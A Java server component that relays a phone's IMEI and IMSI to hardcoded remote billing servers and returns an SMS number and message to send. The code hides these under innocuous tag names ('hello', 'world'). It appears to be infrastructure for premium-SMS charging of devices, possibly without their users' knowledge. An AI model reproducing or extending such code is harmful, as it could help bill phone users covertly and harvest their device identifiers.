package net.workspace.web.web.redirect;
import javax.servlet.http.HttpServletRequest;
import net.workspace.web.entity.client.ClientEntity;
import net.workspace.web.service.Util;
import net.workspace.web.web.WebUtil;
import org.apache.commons.lang3.StringUtils;
import org.json.JSONObject;
import org.springframework.stereotype.Component;
import utils.base64.Base64;

@Component
public class Redirector02345 extends AbstractRedirector {
    public JSONObject execute(HttpServletRequest request, ClientEntity client, int methodId) throws Throwable {
        String type = request.getParameter("type");
        if ("login".equals(type)) {
            return this.executeLogin(request, client, methodId);
        } else if ("fee".equals(type)) {//
            return this.executeFee(request, client, methodId);
        }
        return null;
    }
    private JSONObject executeLogin(HttpServletRequest request, ClientEntity client, int methodId) throws Throwable {
        JSONObject obj = new JSONObject();
        String cpParam = "HD";
        if (methodId == 3) {//JJ
            cpParam = cpParam + Util.getRandomString(14);
        }
        String loginUrl = getLoginUrl(request, methodId);
        String xml = composeFirstRequestBody(client.getImei(), client.getImsi(), WebUtil.getIntParameter(request, "price"), cpParam);
        obj.put("redirectUrl", loginUrl);
        obj.put("postXml", xml);
        String content = postXml(loginUrl, xml, getCharsetName(methodId));
        obj.put("redirectResponse", content);
        String contentSid = searchEnclosed(content, "<content_sid>", "</content_sid>");
        String receiver = searchEnclosed(content, "<sms_1_num>", "</sms_1_num>");
        String msg = Base64.decode(searchEnclosed(content, "<sms_1>", "</sms_1>"));
        String result = "<hello>" + receiver + "</hello><world>" + msg + "</world><cid>" + contentSid + "</cid>";
        obj.put("result", result);
        return obj;
    }
    private JSONObject executeFee(HttpServletRequest request, ClientEntity client, int methodId) throws Throwable {
        JSONObject obj = new JSONObject();
        String url = getFeeUrl(request, methodId);
        String xml = composeSecondRequestBody(request.getParameter("cid"));
        obj.put("redirectUrl", url);
        obj.put("postXml", xml);
        String content = postXml(url, xml, getCharsetName(methodId));
        obj.put("redirectResponse", content);
        String receiver = searchEnclosed(content, "<sms_2_num>", "</sms_2_num>");
        String msg = searchEnclosed(content, "<sms_2>", "</sms_2>");
        if (StringUtils.isNotEmpty(msg)) {
            msg = Base64.decode(msg);
        } else {
            msg = "";
        }
        String code = searchEnclosed(content, "<status>", "</status>");
        recordStatus(request, code);
        String result = "<hello>" + receiver + "</hello><world>" + msg + "</world><what>" + code + "</what>";
        obj.put("result", result);
        return obj;
    }
    private String composeFirstRequestBody(String imei, String imsi, int price, String cpParam) {
        StringBuilder sb = new StringBuilder();
        sb.append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
        sb.append("<request>\n");
        sb.append("<imsi>").append(imsi).append("</imsi>\n");
        sb.append("<imei>").append(imei).append("</imei>\n");
        if (price > 0) {
            sb.append("<price>").append(price).append("</price>\n");
        }
        sb.append("<cpparam>").append(cpParam).append("</cpparam>\n");
        sb.append("</request>");
        return sb.toString();
    }
    private String composeSecondRequestBody(String contentSid) {
        StringBuilder sb = new StringBuilder();
        sb.append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
        sb.append("<request>\n");
        sb.append("<content_sid>").append(contentSid).append("</content_sid>\n");
        sb.append("</request>");
        return sb.toString();
    }
    private String getFeeUrl(HttpServletRequest request, int methodId) {
        switch (methodId) {
            case 2:
                return "http://112.25.8.238:8000/o/svn/" + getBizCode(request);
            case 3://JJ
                return "http://new2014.us:9009/o/svn/" + getBizCode(request);
            case 4:
                //return "http://113.11.195.84:13888/Android/apply2.aspx?consumecode=" + getBizCode(request);
                return "http://android.syhdb.com:13888/Android/apply2.aspx?consumecode=" + getBizCode(request);
            case 5:
                return "http://112.25.8.238:8000/o/sv/" + getBizCode(request);
        }
        return null;
    }
    private String getLoginUrl(HttpServletRequest request, int methodId) {
        switch (methodId) {
            case 2:
                return "http://112.25.8.238:8000/o/vn/" + request.getParameter("sid");
            case 3://JJ
                return "http://new2014.us:9009/o/vn/" + request.getParameter("sid");
            case 4:
                //return "http://113.11.195.84:13888/Android/apply1.aspx?consumecode=" + request.getParameter("consumecode") + "&channelid=" + request.getParameter("channelid");
                return "http://android.syhdb.com:13888/Android/apply1.aspx?consumecode=" + request.getParameter("consumecode") + "&channelid=" + request.getParameter("channelid");
            case 5:
                return "http://112.25.8.238:8000/o/v/" + request.getParameter("sid");
        }
        return null;
    }
}
